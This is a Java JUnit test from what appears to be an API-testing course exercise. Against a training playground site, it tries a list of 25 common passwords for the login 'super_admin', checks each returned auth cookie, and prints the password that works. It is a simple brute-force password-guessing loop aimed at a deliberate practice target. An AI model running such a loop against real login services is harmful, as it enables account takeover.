import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class Lesson2_Ex9_Test {

    @Test
    public void testLesson2_Ex9_Test(){

        String[] str = { "123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777",
                "welcome", "888888", "princess", "dragon", "password1", "123qwe" };
        List<String> list = Arrays.asList(str);

        for (String pass : list) {
            Map<String, String> params = new HashMap<>();
            params.put("login", "super_admin");
            params.put("password", pass);

            Response response = RestAssured
                    .given()
                    .queryParams(params)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }
            Response responseForCheck = RestAssured
                    .given()
                    .body(params)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            if(responseForCheck.getBody().asString().equals("You are authorized")){
                System.out.println("Ваш пароль - " +pass);
            }


        }

    }
}
